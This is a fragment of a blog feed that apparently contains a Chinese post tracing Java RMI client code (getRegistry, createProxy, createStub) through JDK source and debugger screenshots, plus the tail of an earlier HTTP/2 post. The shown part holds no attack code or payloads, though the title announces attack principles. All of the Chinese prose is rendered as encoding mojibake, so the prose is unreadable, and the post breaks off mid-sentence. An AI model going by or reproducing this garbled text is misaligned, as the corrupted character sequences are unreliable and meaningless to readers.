<p><img src="https://i-blog.csdnimg.cn/blog_migrate/6c1518eb180419c56d1cde1f8f3c1325.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ‡å¿—ä½å°±ACKæ¯”è¾ƒé‡è¦ï¼Œè¿™ä¸ªæ ‡è¯†ä½æ˜¯åœ¨æ”¶åˆ°å¯¹ç«¯å‘é€çš„SETTINGSå¸§æ—¶å‘å¯¹ç«¯å›å¤æ—¶è®¾ç½®çš„ï¼Œç”¨ä»¥ç¡®è®¤å·²æ”¶åˆ°æŠ¥æ–‡ã€‚<br>ç„¶åä¸€æ¬¡å®Œæ•´çš„è¿æ¥è¿‡ç¨‹æ˜¯ä»¥Magicå¸§å¼€å¤´GOAWAYå¸§ç»“å°¾çš„ï¼Œä½†åœ¨æˆ‘è§‚å¯Ÿå®é™…æµé‡æ—¶å‘ç°å´æ²¡æœ‰GOAWAYå¸§</p>
]]></content>
      <categories>
        <category>åè®®è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>https</tag>
        <tag>http2</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»ä»£ç å±‚é¢çœ‹RMIè§„èŒƒçš„å®ç°ä¸æ”»å‡»åŸç†ï¼ˆä¸€ï¼‰</title>
    <url>/archives/ca82fc3b.html</url>
    <content><![CDATA[<p>@<a href="%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8BRMI%E8%A7%84%E8%8C%83%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89">TOC</a></p>
<p>ä¸Šä¸€ç¯‡æ–‡ç« ç²—ç³™çš„è®²äº†RMIè§„èŒƒç›¸å…³çš„ä¸€äº›å†…å®¹ï¼Œä»Šå¤©é€šè¿‡ä»£ç è·Ÿè¸ªäº†ä¸€ä¸‹å…·ä½“çš„å®ç°è¿‡ç¨‹ï¼Œå‘ç°æ˜¨å¤©çš„ç†è§£æœ‰ä¸€äº›æ˜¯é”™è¯¯çš„ï¼Œé¦–å…ˆçœ‹ä¸€æ®µå®¢æˆ·ç«¯çš„ä»£ç ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dc2c46acd260661e09a2d95aad5d5816.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬é‡ç‚¹å…³æ³¨ç¬¬15è¡Œä¸16è¡Œï¼Œè¿™ä¸¤è¡Œåˆ†åˆ«æ˜¯è·å¾—ä¸€ä¸ªæ³¨å†Œå™¨ä¸ä»hashè¡¨ä¸­æŸ¥è¯¢marketé”®å¯¹åº”çš„å¯¹è±¡çš„æ“ä½œï¼Œæˆ‘ä»¬é¦–å…ˆæ‰“æ–­æ‰è·Ÿè¿›åˆ°<code>LocateRegistry#getRegistry</code>æ–¹æ³•é‡Œé¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                       RMIClientSocketFactory csf)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">            port = Registry.REGISTRY_PORT;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// If host is blank (as returned by &quot;file:&quot; URL in 1.0.2 used in</span></span><br><span class="line">            <span class="comment">// java.rmi.Naming), try to convert to real local host name so</span></span><br><span class="line">            <span class="comment">// that the RegistryImpl&#x27;s checkAccess will not fail.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// If that failed, at least try &quot;&quot; (localhost) anyway...</span></span><br><span class="line">                host = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Create a proxy for the registry with the given host, port, and</span></span><br><span class="line"><span class="comment">         * client socket factory.  If the supplied client socket factory is</span></span><br><span class="line"><span class="comment">         * null, then the ref type is a UnicastRef, otherwise the ref type</span></span><br><span class="line"><span class="comment">         * is a UnicastRef2.  If the property</span></span><br><span class="line"><span class="comment">         * java.rmi.server.ignoreStubClasses is true, then the proxy</span></span><br><span class="line"><span class="comment">         * returned is an instance of a dynamic proxy class that implements</span></span><br><span class="line"><span class="comment">         * the Registry interface; otherwise the proxy returned is an</span></span><br><span class="line"><span class="comment">         * instance of the pregenerated stub class for RegistryImpl.</span></span><br><span class="line"><span class="comment">         **/</span></span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                        <span class="literal">false</span>);</span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">            (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥æ–¹æ³•æ˜¯ä¸€ä¸ªé‡è½½æ–¹æ³•ï¼Œæˆ‘ä»¬è°ƒç”¨çš„æ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯<code>host, port, csf</code>ï¼Œæ¯”è¾ƒç–‘æƒ‘çš„å¯èƒ½å°±æ˜¯csfäº†ï¼Œè¯¥å‚æ•°ä¼ é€’çš„æ˜¯ä¸€ä¸ª<code>RMIClientSocketFactory</code>æ¥å£çš„å¯¹è±¡ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/433a37af554e1cc218c20ac9b9ae652b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ¹æ®åå­—å¾ˆå®¹æ˜“çœ‹åˆ°åªè¦æœ‰ä¸€ä¸ªè¯¥æ¥å£çš„å®ç°ç±»è°ƒç”¨äº†<code>createSocket</code>æ–¹æ³•å°±ä¼šåˆ›å»ºä¸€ä¸ªsocketï¼Œç»§ç»­å›åˆ°<code>getRegistry</code>æ–¹æ³•<br>å®ƒé¦–å…ˆåˆ¤æ–­äº†ä½ æ˜¯å¦ä¸ºä½ çš„æ–¹æ³•ä¼ å…¥äº†<code>port</code>å‚æ•°ï¼Œå¦‚æœæ²¡æœ‰ä¼ å…¥ï¼Œåˆ™è·å–ç³»ç»Ÿé»˜è®¤çš„ç«¯å£<code>1099</code><br>ç„¶ååˆ¤æ–­ä½ æ˜¯å¦ä¼ å…¥äº†ä¸»æœºåï¼Œå¦‚æœä½ æ²¡æœ‰ä¼ å…¥åˆ™ä¼šä½¿ç”¨æœ¬åœ°ä¸»æœºåï¼Œ<code>loacahost</code>ã€‚<br>ä¸‹ä¸€æ­¥å°†ä¼šåˆ›å»ºä¸€ä¸ªLiveRefå¯¹è±¡ï¼Œè‡³äºå¹²ä»€ä¹ˆçš„æˆ‘ä¸æ¸…æ¥šï¼Œç®€å•çœ‹äº†çœ‹å°±æ˜¯ä¸ºä¸€äº›å˜é‡èµ‹å€¼ï¼Œåé¢ä¼šç”¨åˆ°å®ƒä»¬ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/73f8cc3eba58a21d03f3c0379b897e01.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°<code>host, port,csf</code>éƒ½è¢«ä»–ä½¿ç”¨äº†ã€‚å…·ä½“æ˜¯é€šè¿‡<code>TCPEndpoint</code>è¿™ä¸ªæ–¹æ³•ä¼ è¿›å»çš„ï¼Œè¿™äº›æ–¹æ³•çš„ä½œç”¨å…·ä½“ä¸å¤ªæ¸…æ¥šï¼Œæ¯•ç«Ÿä¸æ˜¯ä¸“ä¸šçš„ã€‚<br>ç„¶ååˆ›å»ºäº†ä¸€ä¸ª<code>RemoteRet</code>å¯¹è±¡ï¼Œ<br><code>csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef)</code><br>å¦‚æœcsfä¸ºnullï¼Œåˆ™å®ä¾‹åŒ–<code>UnicastRef</code><br>æˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/94eca87ca47b8a9a0ee84f7a6c84ee6a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬çœ‹è¿™ä¸ªå•æ’­å¼•ç”¨ç±»æ˜¯å®ç°äº†<code>RemoteRef</code>æ¥å£çš„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f4cf160b5bfbfc4d6fbb7ba9c2ca7b1c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€Œè¿™ä¸ª<code>RemoteRef</code>æ¥å£åˆæ˜¯ç»§æ‰¿äº†<code>Externalizable</code>æ¥å£ï¼Œè¿™æ„å‘³ç€è¯¥ç±»å¯ä»¥è¢«åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚<br>æˆ‘ä»¬å®ä¾‹åŒ–æ—¶è°ƒç”¨çš„æ„é€ æ–¹æ³•æ˜¯è¿™ä¸€ä¸ªï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7364e60c6051154f22ac6c0babd799cd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>refæ˜¯ä¸€ä¸ªLiveRefç±»å‹çš„å˜é‡ã€‚é™¤äº†è¿™ä¸ªåŠ¨ä½œæ²¡æœ‰å…¶ä»–çš„åŠ¨ä½œäº†<br>å¿ƒè¡€æ¥æ½®æˆ‘åˆå›å»çœ‹äº†ä¸€ä¸‹<code>LiveRef</code>ç±»ï¼Œä»–ç»§æ‰¿äº†Cloneableæ¥å£ï¼Œè¯æ˜å®ƒå¯ä»¥è¢«å…‹éš†ï¼Œè‡³äºä»€ä¹ˆäº‹å…‹éš†æš‚æ—¶ä¸æ¸…æ¥šï¼Œå†™å®Œäº†å»çœ‹çœ‹ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6bdb8f78323c8e77298a6556f840e565.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­å›åˆ°<code>getRegistry</code>æ–¹æ³•ï¼Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e2008aa62eb947f81a31d64c989d8eb7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>createProxyæ–¹æ³•æ¥å—äº†ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>RegistryImpl</code>ç±»çš„Classå®ä¾‹ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸Šé¢æåˆ°çš„refï¼Œç¬¬ä¸‰ä¸ªæ˜¯ä¸€ä¸ªbooleanå€¼ï¼Œçœ‹æç¤ºæ˜¯æ˜¯å¦å¼ºåˆ¶ä½¿ç”¨Stubï¼Œæˆ‘ä»¬è¿™é‡Œä¼ é€’çš„æ˜¯<code>false</code>ï¼Œä¹Ÿå°±æ˜¯ä¸ä½¿ç”¨ã€‚<br>æˆ‘ä»¬è·Ÿè¿›è¯¥æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                     RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                     <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; remoteClass;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            remoteClass = getRemoteClass(implClass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">                implClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">            !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> implClass.getClassLoader();</span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt;[] interfaces = getRemoteInterfaces(implClass);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(clientRef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* REMIND: private remote interfaces? */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                           interfaces,</span><br><span class="line">                                                           handler);</span><br><span class="line">                &#125;&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/442dea619c0643cc0ed79dc8a48ee273.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°ç¬¬13è¡Œçš„æ–¹æ³•ï¼Œè·Ÿä¸€ä¸‹çœ‹çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/13ebee87d6b540073f9077c94d72b8a2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><code>getRemoteClass</code>è¿ç”¨äº†javaçš„æ”¾å°„åŸç†ï¼Œ<br>194è¡Œè·å¾—äº†<code>RegistryImpl</code>ç±»å®ç°çš„æ‰€æœ‰æ¥å£çš„Classå¯¹è±¡ï¼Œç„¶åéå†è¿™äº›æ¥å£é€šè¿‡è°ƒç”¨<code>Remote</code>ç±»Classå¯¹è±¡çš„<code>isAssignagleFrom</code>æ–¹æ³•åˆ¤æ–­Remoteæ˜¯ä¸æ˜¯è¿™äº›æ¥å£çš„çˆ¶ç±»ã€è¶…æ¥å£ã€æˆ–è€…åŒä¸€ç±»å‹ã€‚<br>é‚£ä¹ˆåˆ°åº•æ˜¯ä¸æ˜¯å‘¢ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†<code>RegistryImpl</code>ç±»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/cd4bf8099daeb1ff6d8e4ae2aebf853d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å®ƒé›†æˆäº†<code>RemoteServer</code>ç±»ï¼Œå®ç°äº†<code>Register</code>æ¥å£<br>è€Œ<code>RemoteServer</code>çš„çˆ¶ç±»å®ç°äº†<code>Remote</code>æ¥å£ï¼Œ<code>Register</code>æ¥å£ç»§æ‰¿äº†<code>Remote</code>æ¥å£ï¼Œæ‰€ä»¥ä¸Šé¢çš„æ¡ä»¶æ˜¯æˆç«‹çš„ï¼Œå°†ä¼šæ”¾å›lcï¼Œä¹Ÿå°±æ˜¯<code>Registry</code>ç±»çš„Classå¯¹è±¡ï¼Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/646884aa623fa0b36879861937bcd998.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è°ƒè¯•ç»“æœä¹Ÿè¯å®äº†æˆ‘ä»¬çš„æ¨æ–­ã€‚<br>ç„¶åè¿›å…¥ä¸€ä¸ªifåˆ¤æ–­ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5dd542afad768b13c489070d87531bd3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬çŸ¥é“<code>forceStubUser</code>æ˜¯<code>false</code>çš„ï¼Œä½†æ˜¯è°ƒè¯•çš„ç»“æœæ˜¯è®¡å…¥äº†è¯¥<code>if</code>çš„åˆ¤æ–­ä¸­ï¼Œé‚£ä¹ˆåé¢åˆ¤æ–­æ¡ä»¶å°±å¿…é¡»æ˜¯<code>true</code>ï¼Œæˆ‘ä»¬å…ˆçœ‹<code>ignoreStubClasses</code><br>è¿™ä¸ªå€¼æ˜¯åœ¨<code>Util</code>ç±»è¢«åŠ è½½çš„æ—¶å€™èµ‹å€¼çš„ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/80023964b8a5ca6514d40400914faa02.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›<code>booleanValue</code>æ–¹æ³•<img src="https://i-blog.csdnimg.cn/blog_migrate/3b9842e3cc2c528b227e430172ac8ca0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°åˆ°äº†<code>Boolean</code>ç±»ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯å…¶é»˜è®¤å€¼ï¼Œæˆ‘ä»¬çŸ¥é“Booleançš„é»˜è®¤å€¼ä¸ºFalseã€‚<br>é‚£ä¹ˆçœ‹ç¬¬ä¸‰ä¸ªå‚æ•°<code>stubClassExists</code>çš„è¿”å›å€¼å¿…é¡»ä¸º<code>true</code>æ‰èƒ½æ»¡è¶³è°ƒè¯•çš„ç»“æœï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/eaedc98b131b660f4c07765bb71af399.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½±å“åˆ¤æ–­çš„ç»“æœçš„è¯­å¥æ˜¯<br><code>!withoutStubs.containsKey(remoteClass)</code><br>å¦‚æœä¸º<code>true</code>åˆ™è¿”å›trueï¼Œæˆ‘ä»¬çŸ¥é“containsKeyæ–¹æ³•ä¸€èˆ¬æ˜¯åœ¨é›†åˆç±»å‹ä¸­ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æŒ‡å®šæ˜ å°„å…³ç³»ï¼Œæˆ‘ä»¬çœ‹çœ‹withoutStubsæ˜¯å¦ä¸ºé›†åˆç±»å‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a60773d7b77631b90800f05a34dc99a3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¡®å®æ˜¯ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰å¯¹åº”çš„æ˜ å°„å‘¢ï¼Ÿå¾ˆæ˜æ˜¾æ˜¯æ²¡æœ‰çš„ï¼Œé‚£ä¹ˆåˆ°è¿™é‡Œæ¡ä»¶å°±æ»¡è¶³äº†ã€‚æ³¨æ„åˆ°äº†åœ¨ifé‡Œé¢è¿˜é€šè¿‡javaçš„åå°„æœºåˆ¶å°†<code>RegisterImpl_Stub</code>ç±»åŠ è½½åˆ°äº†å†…å­˜ä¸­ã€‚<br><code>createProxy</code>çš„ifæ¡ä»¶æ»¡è¶³åï¼Œå°±è¿›å…¥åˆ°æ–¹æ³•<code>createStub</code>ï¼Œçœ‹ç€æ–¹æ³•åå°±çŸ¥é“æ˜¯å‡†å¤‡åˆ›å»ºä¸€ä¸ªå®¢æˆ·ç«¯å­˜æ ¹äº†ï¼Œä¸è¿‡å¥‡æ€ªçš„åœ°æ–¹æ¥äº†ï¼Œæ˜¨å¤©ä¸æ˜¯è®²äº†ï¼Œå®¢æˆ·ç«¯å­˜æ ¹æ˜¯åœ¨æ³¨å†Œä¸­å…´åˆ›å»ºç„¶åè¿œç¨‹åŠ è½½åˆ°å®¢æˆ·ç«¯çš„å—ï¼Ÿè¿™å„¿æ€ä¹ˆåˆåœ¨å®¢æˆ·ç«¯åˆ›å»ºäº†ï¼Ÿè¿™é‡Œæˆ‘çš„ç†è§£æ˜¯ï¼Œåœ¨æ³¨å†Œä¸­å¿ƒåˆ›å»ºçš„å­˜æ ¹åˆ›å»ºåç»è¿‡åºåˆ—åŒ–ï¼Œä¼ è¾“åˆ°å®¢æˆ·ç«¯ï¼Œç„¶åå®¢æˆ·ç«¯éœ€è¦æœ‰å¯¹åº”ç±»å‹çš„å¯¹è±¡æ¥æ¥æ”¶ä»–ï¼Œæ‰€æœ‰è¿™é‡Œå®¢æˆ·ç«¯ä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªå­˜æ ¹ï¼Œçº¯å±ä¸ªäººç†è§£ä¸çŸ¥é“å¯¹ä¸å¯¹ã€‚<br><code>createStub</code>è¿™ä¸ªæ–¹æ³•æ¥æ”¶äº†è¿ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯<code>remoteClass</code>ï¼Œä¹Ÿå°±æ˜¯<code>RegistryImpl</code>ç±»çš„Classå¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯<code>clientRef</code>è¿™ä¸ªæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå¥½åƒç»™è·Ÿæ¼äº†ï¼Œä¸ç€æ€¥ï¼Œæˆ‘ä»¬æ‰¾ä¸€æ‰¾ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5e2d5a6740f6a4e23b6689ff9dce7c5d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åŸæ¥<code>createProxy</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšä¼ è¿›æ¥çš„<code>ref</code>ä¸€ä¸ªå•æ’­å¼•ç”¨å¯¹è±¡<code>UnicastRef</code>ç»§æ‰¿ä¹<code>RemoteRef</code><br>è·Ÿè¿›<code>createStub</code>æ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e372f5b4e9b9d79eb7ea630e0631ee76.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆè·å–äº†<code>stubname</code>å³<code>RegistryImpl_Stub</code><br>ç„¶å291åˆ°294è¡ŒåŠ è½½äº†<code>RegistryImpl_Stub</code>ç±»åˆ°å†…å­˜ä¸­,å¹¶è·å–äº†å…¶æ‰€æœ‰çš„æ„é€ æ–¹æ³•ï¼Œç„¶åè°ƒç”¨äº†å…¶ä¸­çš„ä¸€ä¸ªæœ‰å‚æ„é€ æ–¹æ³•å°†<code>ref</code>ä½œä¸ºå‚æ•°ä¼ é€’äº†è¿›å»ã€‚<br>è¿™æ—¶å€™å¾—æƒ³åŠæ³•è¿›åˆ°<code>RegistryImpl_Stub</code>ç±»é‡Œé¢çœ‹çœ‹è°ƒç”¨äº†æ€æ ·çš„æ–¹æ³•ï¼Œå› ä¸ºæœ€ç»ˆæ”¾å›çš„<code>Registry</code>ä¼šè°ƒç”¨lookupæ–¹æ³•ï¼Œæˆ‘ä»¬é€šè¿‡è¯¥æ–¹æ³•æ‰¾åˆ°å¯¹åº”çš„å®ç°ç±»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/00f415e5d43c9694fc309251e82e6534.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥åæ‰¾åˆ°å¯¹åº”çš„æ„é€ æ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ac54b1bc4245ba130b0b54b9efb0ad22.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨superè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œæ‰¾åˆ°<code>RegistryImpl_Stub</code>çš„çˆ¶ç±»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1dfaa82c2b8acfcfd4a00c08d88434f9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ç»å¯¹æ˜¯åœ¨å¥—å¨ƒï¼Œæ²¡è·‘äº†ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/76b62e0fef1ab8ea167a0899c47e4032.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘è‰ï¼Œè¿™å•¥ä¹Ÿæ²¡å¹²å•Šï¼Œå°±èµ‹äº†ä¸ªå€¼ç½¢äº†ã€‚ä¸ç®¡äº†ï¼Œæˆ‘ä»¬ç»§ç»­ã€‚<br>æ‰€ä»¥<code>createStub</code>æ–¹æ³•æœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ª<code>RemoteStub</code>å¯¹è±¡ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e637c33399b0c63a5b71f07d5d6d306c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç„¶å<code>createProxy</code>ç»§ç»­å°†è¿™ä¸ªå¯¹è±¡å¾€ä¸Šä¸€å±‚æŠ›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/afc6e7e0dd8154abc68be33a0de6b8cf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€ååœ¨<code>getRegistry</code>æ–¹æ³•ä¸­è¢«å¼ºè½¬ä¸º<code>Registry</code>ç±»å‹çš„å¯¹è±¡ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2cbb3d4be5b250b90bbc2c01a4cecfc0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬çŸ¥é“åƒä¸‹è½¬å‹æ‰æ˜¯éœ€è¦å¼ºè½¬çš„ï¼Œé‚£ä¹ˆ<code>Registry</code>åˆ°åº•æ˜¯ä¸æ˜¯<code>RemoteStub</code>ç±»å‹çš„å­ç±»å‘¢ï¼Ÿ<br>è²Œä¼¼å¥½åƒä¸æ˜¯çš„ï¼Œè¿™ä¸ªçš„åŸç†æˆ‘ä¸å¤ªç†è§£ï¼Œæ˜¯çŸ¥è¯†è¿˜æœ‰æ¬ ç¼ºï¼Œå®é™…ä¸Š<code>Registry</code>æ˜¯ä¸€ä¸ªæ¥å£ç»§æ‰¿äº†<code>Remote</code>æ¥å£<br><img src="https://i-blog.csdnimg.cn/blog_migrate/effaacb1129012dcc50601b360a4bf87.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€Œ<code>RemoteStub</code>ç»§æ‰¿äº†<code>RemoteObject</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/2b2e5aa9c064976943c43abd97560713.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€Œ<code>RemoteObject</code>ç±»å®ç°äº†<code>Remote</code>æ¥å£<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2fcbd9f29e84cfb93491b602bc752f31.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥è¿™ç®—ä»€ä¹ˆï¼Ÿ<br>è¿™ä¹Ÿä¸æ˜¯å‘ä¸‹è½¬å‹ï¼Œè€Œæ˜¯å‘ä¸Šè½¬å‹ï¼Œä¸ç®—ä¸€èˆ¬æ„ä¹‰ä¸Šçš„å¼ºè½¬ï¼Œå½“ç„¶å‘ä¸Šè½¬å‹ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨å¼ºè½¬çš„ã€‚<br>è¿™é‡Œçš„æˆ‘çš„ç†è§£æ˜¯<code>RemoteStub</code>å‘ä¸Šè½¬å‹åˆ°<code>Remote</code>ï¼Œå› 